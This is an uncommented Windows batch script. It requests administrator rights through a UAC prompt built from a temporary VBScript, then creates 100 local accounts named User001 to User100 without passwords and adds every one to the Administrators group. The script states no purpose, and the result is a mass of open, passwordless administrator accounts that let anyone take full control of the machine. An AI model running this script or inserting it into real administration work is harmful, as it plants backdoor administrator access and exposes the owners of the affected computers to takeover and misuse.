 @echo off
 CLS

:init
 setlocal DisableDelayedExpansion
 set cmdInvoke=1
 set winSysFolder=System32
 set "batchPath=%~0"
 for %%k in (%0) do set batchName=%%~nk
 set "vbsGetPrivileges=%temp%\OEgetPriv_%batchName%.vbs"
 setlocal EnableDelayedExpansion

:checkPrivileges
  NET FILE 1>NUL 2>NUL
  if '%errorlevel%' == '0' ( goto gotPrivileges ) else ( goto getPrivileges )

:getPrivileges
  if '%1'=='ELEV' (echo ELEV & shift /1 & goto gotPrivileges)

  ECHO Set UAC = CreateObject^("Shell.Application"^) > "%vbsGetPrivileges%"
  ECHO args = "ELEV " >> "%vbsGetPrivileges%"
  ECHO For Each strArg in WScript.Arguments >> "%vbsGetPrivileges%"
  ECHO args = args ^& strArg ^& " "  >> "%vbsGetPrivileges%"
  ECHO Next >> "%vbsGetPrivileges%"

  if '%cmdInvoke%'=='1' goto InvokeCmd 

  ECHO UAC.ShellExecute "!batchPath!", args, "", "runas", 1 >> "%vbsGetPrivileges%"
  goto ExecElevation

:InvokeCmd
  ECHO args = "/c """ + "!batchPath!" + """ " + args >> "%vbsGetPrivileges%"
  ECHO UAC.ShellExecute "%SystemRoot%\%winSysFolder%\cmd.exe", args, "", "runas", 1 >> "%vbsGetPrivileges%"

:ExecElevation
 "%SystemRoot%\%winSysFolder%\WScript.exe" "%vbsGetPrivileges%" %*
 exit /B

:gotPrivileges
 setlocal & cd /d %~dp0
 if '%1'=='ELEV' (del "%vbsGetPrivileges%" 1>nul 2>nul  &  shift /1)

 ::::::::::::::::::::::::::::
 ::START
 ::::::::::::::::::::::::::::
net user /add User001
net user /add User002
net user /add User003
net user /add User004
net user /add User005
net user /add User006
net user /add User007
net user /add User008
net user /add User009
net user /add User010
net user /add User011
net user /add User012
net user /add User013
net user /add User014
net user /add User015
net user /add User016
net user /add User017
net user /add User018
net user /add User019
net user /add User020
net user /add User021
net user /add User022
net user /add User023
net user /add User024
net user /add User025
net user /add User026
net user /add User027
net user /add User028
net user /add User029
net user /add User030
net user /add User031
net user /add User032
net user /add User033
net user /add User034
net user /add User035
net user /add User036
net user /add User037
net user /add User038
net user /add User039
net user /add User040
net user /add User041
net user /add User042
net user /add User043
net user /add User044
net user /add User045
net user /add User046
net user /add User047
net user /add User048
net user /add User049
net user /add User050
net user /add User051
net user /add User052
net user /add User053
net user /add User054
net user /add User055
net user /add User056
net user /add User057
net user /add User058
net user /add User059
net user /add User060
net user /add User061
net user /add User062
net user /add User063
net user /add User064
net user /add User065
net user /add User066
net user /add User067
net user /add User068
net user /add User069
net user /add User070
net user /add User071
net user /add User072
net user /add User073
net user /add User074
net user /add User075
net user /add User076
net user /add User077
net user /add User078
net user /add User079
net user /add User080
net user /add User081
net user /add User082
net user /add User083
net user /add User084
net user /add User085
net user /add User086
net user /add User087
net user /add User088
net user /add User089
net user /add User090
net user /add User091
net user /add User092
net user /add User093
net user /add User094
net user /add User095
net user /add User096
net user /add User097
net user /add User098
net user /add User099
net user /add User100

net localgroup Administrators /add User001
net localgroup Administrators /add User002
net localgroup Administrators /add User003
net localgroup Administrators /add User004
net localgroup Administrators /add User005
net localgroup Administrators /add User006
net localgroup Administrators /add User007
net localgroup Administrators /add User008
net localgroup Administrators /add User009
net localgroup Administrators /add User010
net localgroup Administrators /add User011
net localgroup Administrators /add User012
net localgroup Administrators /add User013
net localgroup Administrators /add User014
net localgroup Administrators /add User015
net localgroup Administrators /add User016
net localgroup Administrators /add User017
net localgroup Administrators /add User018
net localgroup Administrators /add User019
net localgroup Administrators /add User020
net localgroup Administrators /add User021
net localgroup Administrators /add User022
net localgroup Administrators /add User023
net localgroup Administrators /add User024
net localgroup Administrators /add User025
net localgroup Administrators /add User026
net localgroup Administrators /add User027
net localgroup Administrators /add User028
net localgroup Administrators /add User029
net localgroup Administrators /add User030
net localgroup Administrators /add User031
net localgroup Administrators /add User032
net localgroup Administrators /add User033
net localgroup Administrators /add User034
net localgroup Administrators /add User035
net localgroup Administrators /add User036
net localgroup Administrators /add User037
net localgroup Administrators /add User038
net localgroup Administrators /add User039
net localgroup Administrators /add User040
net localgroup Administrators /add User041
net localgroup Administrators /add User042
net localgroup Administrators /add User043
net localgroup Administrators /add User044
net localgroup Administrators /add User045
net localgroup Administrators /add User046
net localgroup Administrators /add User047
net localgroup Administrators /add User048
net localgroup Administrators /add User049
net localgroup Administrators /add User050
net localgroup Administrators /add User051
net localgroup Administrators /add User052
net localgroup Administrators /add User053
net localgroup Administrators /add User054
net localgroup Administrators /add User055
net localgroup Administrators /add User056
net localgroup Administrators /add User057
net localgroup Administrators /add User058
net localgroup Administrators /add User059
net localgroup Administrators /add User060
net localgroup Administrators /add User061
net localgroup Administrators /add User062
net localgroup Administrators /add User063
net localgroup Administrators /add User064
net localgroup Administrators /add User065
net localgroup Administrators /add User066
net localgroup Administrators /add User067
net localgroup Administrators /add User068
net localgroup Administrators /add User069
net localgroup Administrators /add User070
net localgroup Administrators /add User071
net localgroup Administrators /add User072
net localgroup Administrators /add User073
net localgroup Administrators /add User074
net localgroup Administrators /add User075
net localgroup Administrators /add User076
net localgroup Administrators /add User077
net localgroup Administrators /add User078
net localgroup Administrators /add User079
net localgroup Administrators /add User080
net localgroup Administrators /add User081
net localgroup Administrators /add User082
net localgroup Administrators /add User083
net localgroup Administrators /add User084
net localgroup Administrators /add User085
net localgroup Administrators /add User086
net localgroup Administrators /add User087
net localgroup Administrators /add User088
net localgroup Administrators /add User089
net localgroup Administrators /add User090
net localgroup Administrators /add User091
net localgroup Administrators /add User092
net localgroup Administrators /add User093
net localgroup Administrators /add User094
net localgroup Administrators /add User095
net localgroup Administrators /add User096
net localgroup Administrators /add User097
net localgroup Administrators /add User098
net localgroup Administrators /add User099
net localgroup Administrators /add User100
exit
